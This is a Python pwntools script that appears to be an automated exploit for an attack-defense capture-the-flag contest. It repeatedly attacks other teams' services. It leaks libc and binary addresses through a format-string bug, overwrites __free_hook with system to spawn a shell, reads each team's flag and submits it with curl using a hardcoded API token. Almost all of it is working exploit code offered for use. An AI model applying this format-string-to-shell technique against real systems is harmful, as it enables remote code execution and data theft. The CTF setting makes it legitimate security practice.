# by mathboy7
import sys
from os import *
from random import randrange
from pwn import *

OUR_TEAM = 14
TEST = 0

def submit_flag(team_number, flag):
    print '%d flag: %s' % (team_number, flag)
    if TEST == 0:
        os.system('curl http://10.66.20.15/api/v1/jad/web/submit_flag/?event_id=2 -d \'flag=%s&token=hEjrar35KXJkyjt4Bl7UyvAK3szuzU8hHAntVQVDftnDQ\'' % flag)

context.timeout = 1

def create(l1, d1, l2, d2, l3, d3):
    r.sendline("1")
    r.recvuntil(": ")
    r.sendline(str(l1))
    r.recvuntil(": ")
    r.sendline(str(d1))
    r.recvuntil(": ")
    r.sendline(str(l2))
    r.recvuntil(": ")
    r.sendline(str(d2))
    r.recvuntil(": ")
    r.sendline(str(l3))
    r.recvuntil(": ")
    r.sendline(str(d3))
    r.recvuntil(">>> ")

def login(l1, d1, l2, d2):
    r.sendline("0")
    r.recvuntil(": ")
    r.sendline(str(l1))
    r.recvuntil(": ")
    r.sendline(str(d1))
    r.recvuntil(": ")
    r.sendline(str(l2))
    r.recvuntil(": ")
    r.sendline(str(d2))
    r.recvuntil(">>> ")

def add_console():
    r.sendline("0")
    r.recvuntil(">>> ")
    r.sendline("0")
    r.recvuntil(">>> ")

while True:
    for team in [range(1, 21), range(OUR_TEAM, OUR_TEAM + 1)][TEST]:
        try:
            r = remote('172.30.%d.14' % team, 9999)
            if TEST == 0 and team == OUR_TEAM:
                r.close()
                continue

            r.recvuntil(">>> ")

            create(5, "asdf", 5, "asdf", 5, "asdf")
            login(5, "asdf", 5, "asdf")

            add_console()
            r.sendline("2")
            r.recvuntil(": ")
            r.sendline("0")
            r.recvuntil("E.g :")
            r.sendline("%3$p %6$p %7$p " + p64(0x414141414141))

            r.recvuntil("0x")
            rv = int(r.recvuntil(" ")[:-1], 16)
            libc_base = rv - 0x110081

            r.recvuntil("0x")
            rv = int(r.recvuntil(" ")[:-1], 16)
            binary = rv - 0x1090

            r.recvuntil(">>> ")

            # print "libc: " + hex(libc_base)
            # print "binary: " + hex(binary)

            r.sendline("2")
            r.recvuntil(": ")
            r.sendline("0")
            r.recvuntil("E.g :")

            free_hook = libc_base + 0x3ed8e8
            system = libc_base + 0x4f440

            low1 = system & 0xff
            low2 = (system>>8)&0xff
            low3 = (system>>16)&0xff
            low4 = (system>>24)&0xff
            low5 = (system>>32)&0xff
            low6 = (system>>40)&0xff

            # 24
            payload = "%" + str(low1) + "c%24$hhn"
            payload += "%" + str(low2 - low1 + 0x100) + "c%25$hhn"
            payload += "%" + str(low3 - low2 + 0x200) + "c%26$hhn"
            payload += "%" + str(low4 - low3 + 0x200) + "c%27$hhn"
            payload += "%" + str(low5 - low4 + 0x200) + "c%28$hhn"
            payload += "%" + str(low6 - low5 + 0x200) + "c%29$hhn"

            payload += "a"*(0x80-len(payload))

            payload += p64(free_hook)
            payload += p64(free_hook+1)
            payload += p64(free_hook+2)
            payload += p64(free_hook+3)
            payload += p64(free_hook+4)
            payload += p64(free_hook+5)

            r.sendline(payload)
            r.recvuntil(">>> ")
            r.sendline("0")
            r.recvuntil(">>> ")
            r.sendline("1")
            r.recvuntil(": ")
            r.sendline("300")
            r.recvuntil(": ")
            r.sendline("/bin/sh\x00")
            r.sendline("1")
            r.recvuntil(": ")
            r.sendline("1")
            r.sendline("cat flag")

            flag = r.recvuntil("\n").strip()

            # print "flag: " + flag

            r.close()

            if len(flag) > 0:
                submit_flag(team, flag)
        except Exception as e:
            print e

    sleep(3)
